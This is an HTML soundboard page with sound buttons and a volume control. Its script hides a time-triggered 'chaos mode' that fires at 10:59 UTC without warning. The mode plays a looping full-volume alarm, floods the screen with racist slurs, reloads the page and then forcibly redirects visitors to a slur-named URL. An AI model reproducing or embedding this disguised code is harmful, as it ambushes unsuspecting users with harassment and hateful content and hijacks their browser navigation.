<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Soundboard</title>
  <style>
    body {
      background-color: #121212;
      color: #ffffff;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 2rem;
      overflow: hidden;
    }
    h1 {
      margin-bottom: 2rem;
      color: #00ffcc;
    }
    .soundboard {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
      gap: 1rem;
      width: 100%;
      max-width: 800px;
    }
    .sound-button {
      background-color: #1e1e1e;
      border: 2px solid #00ffcc;
      padding: 0.75rem;
      border-radius: 10px;
      cursor: pointer;
      text-align: center;
      transition: 0.2s ease;
    }
    .sound-button:hover {
      background-color: #00ffcc;
      color: #000;
    }
    .controls {
      margin-top: 1rem;
      display: flex;
      align-items: center;
      gap: 1rem;
    }
    input[type="range"] {
      width: 150px;
    }
  </style>
</head>
<body>

  <h1>ðŸŽ§ Soundboard</h1>

  <div class="soundboard">
    <div class="sound-button" onclick="playSound(0)">Sound 1</div>
    <div class="sound-button" onclick="playSound(1)">Sound 2</div>
    <div class="sound-button" onclick="playSound(2)">Sound 3</div>
    <div class="sound-button" onclick="playSound(3)">Sound 4</div>
    <div class="sound-button" onclick="playSound(4)">Sound 5</div>
    <div class="sound-button" onclick="playSound(5)">New KEM Sound</div>
    <div class="sound-button" onclick="playSound(6)">Sound 7</div>
    <div class="sound-button" onclick="playSound(7)">Sound 8</div>
    <div class="sound-button" onclick="playSound(8)">Goober Sound</div>
    <div class="sound-button" onclick="playSound(9)">Sound 9</div>
    <div class="sound-button" onclick="playSound(10)">Sound 10</div>
    <div class="sound-button" onclick="playSound(11)">Sound 11</div>
    <div class="sound-button" onclick="playSound(12)">Sound 12</div>
    <div class="sound-button" onclick="playSound(13)">Sound 13</div>
    <div class="sound-button" onclick="playSound(14)">Sound 14</div>
    <div class="sound-button" onclick="playSound(15)">Sound 15</div>
  </div>

  <div class="controls">
    <label for="volumeSlider">Volume:</label>
    <input type="range" id="volumeSlider" min="0" max="1" step="0.01" value="1">
  </div>

  <script>
    let currentAudio = null;
    let alarmAudio = null;
    let chaosInterval;
    let chaosActive = false;
    let chaosTriggered = false;
    let chaosRedirected = false;

    const sounds = [
      "sound1.mp3",
      "sound2.mp3",
      "sound3.mp3",
      "sound4.mp3",
      "sound5.mp3",
      "youtube_kem5AfOws9Y_audio.mp3",
      "sound7.mp3",
      "sound8.mp3",
      "reddit_xxx_goober_xxx_1k37csw_audio.mp3",
      "sound9.mp3",
      "sound10.mp3",
      "sound11.mp3",
      "sound12.mp3",
      "sound13.mp3",
      "sound13 (1).mp3",
      "sound14.mp3",
      "sound15.mp3"
    ];

    const alarmSoundSrc = "youtube_onib3bDo6Z0_audio.mp3";
    const backgroundImage = "fdc33b7f-7999-4173-97c8-377c039eb5af.png";
    const chaosWord = "im spanish now negro";
    const chaosRedirectUrl = "https://wwww.wherecanibuyniggers.com"; // CHANGE THIS!

    function playSound(index) {
      if (currentAudio) {
        currentAudio.pause();
        currentAudio.currentTime = 0;
      }
      const audio = new Audio(sounds[index]);
      audio.volume = document.getElementById('volumeSlider').value;

      if (index === 8) {
        audio.addEventListener('loadedmetadata', () => {
          audio.currentTime = 270;
          audio.play();
          setTimeout(() => {
            audio.pause();
          }, 8000);
        });
      } else {
        audio.play();
      }
      currentAudio = audio;
    }

    function startChaosMode() {
      if (chaosActive) return;
      chaosActive = true;

      document.body.style.backgroundImage = `url('${backgroundImage}')`;
      document.body.style.backgroundSize = 'cover';

      alarmAudio = new Audio(alarmSoundSrc);
      alarmAudio.loop = true;
      alarmAudio.volume = 1.0;
      alarmAudio.play();

      chaosInterval = setInterval(() => {
        const span = document.createElement("span");
        span.textContent = chaosWord;
        span.style.position = "absolute";
        span.style.left = Math.random() * window.innerWidth + "px";
        span.style.top = Math.random() * window.innerHeight + "px";
        span.style.color = "red";
        span.style.fontWeight = "bold";
        span.style.fontSize = "2rem";
        span.style.opacity = 0.8;
        document.body.appendChild(span);
      }, 200);

      if (!chaosTriggered) {
        chaosTriggered = true;
        setTimeout(() => {
          location.reload();
        }, 500);
      }

      if (!chaosRedirected) {
        chaosRedirected = true;
        setTimeout(() => {
          window.location.href = chaosRedirectUrl;
        }, 10000);
      }
    }

    function checkTimeForChaos() {
      const now = new Date();
      const utcHours = now.getUTCHours();
      const utcMinutes = now.getUTCMinutes();

      if (utcHours === 10 && utcMinutes === 59) {
        startChaosMode();
      }
    }

    setInterval(checkTimeForChaos, 1000);
    window.onload = checkTimeForChaos;
  </script>

</body>
</html>
